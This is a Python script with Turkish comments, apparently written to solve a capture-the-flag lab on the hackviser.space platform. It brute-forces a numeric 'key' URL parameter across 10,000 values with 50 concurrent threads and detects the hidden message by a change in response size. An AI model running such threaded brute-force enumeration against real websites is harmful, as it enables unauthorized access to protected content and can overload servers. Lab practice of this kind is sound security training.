import requests
import concurrent.futures
import sys

base_url = "https://funny-sunspot.europe1.hackviser.space/index.php"
varsayilan_boyut = None

def anahtari_dene(key):
    global varsayilan_boyut
    try:
        # timeout=5 ekledik ki sunucu yanıt vermezse sonsuza kadar beklemesin
        response = requests.get(base_url, params={'key': key}, timeout=5)
        guncel_boyut = len(response.content)
        
        # İlerlemeyi ekranda görelim (her 100'ün katında yazdırır)
        if key % 100 == 0:
            print(f"Deneniyor: {key}...", end="\r")

        # Eğer boyut referanstan farklıysa mesajı bulduk demektir!
        if varsayilan_boyut is not None and guncel_boyut != varsayilan_boyut:
            print(f"\n\n[+] BİNGO! Doğru Key Değeri: {key}")
            print(f"[+] Sayfa Boyutu: {guncel_boyut} byte")
            print(f"[+] İŞTE GİZLİ MESAJ: \n{response.text.strip()}")
            
            # Bulduğumuz an tüm programı durduruyoruz
            sys.exit() 
            
    except requests.exceptions.RequestException:
        pass # Bağlantı koparsa veya yavaşlarsa o sayıyı atla

def baslat():
    global varsayilan_boyut
    print("Çoklu iş parçacığı (Threading) ile tarama başlatılıyor...")
    
    # Önce referans alacağımız yanlış sayfa boyutunu bulalım (key=1 için)
    try:
        res = requests.get(base_url, params={'key': 1})
        varsayilan_boyut = len(res.content)
        print(f"Referans yanlış sayfa boyutu: {varsayilan_boyut} byte\n")
    except Exception as e:
        print("Siteye ulaşılamadı. Bağlantını kontrol et.")
        return

    # max_workers=20 demek, aynı anda 20 istek gönderilecek demektir.
    # Bu sayıyı çok yükseltirsen site seni DDOS atıyor sanıp engelleyebilir. 20-30 idealdir.
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        anahtarlar = range(2, 10001)
        # Bütün sayıları Thread havuzuna gönderiyoruz
        executor.map(anahtari_dene, anahtarlar)

if __name__ == "__main__":
    baslat()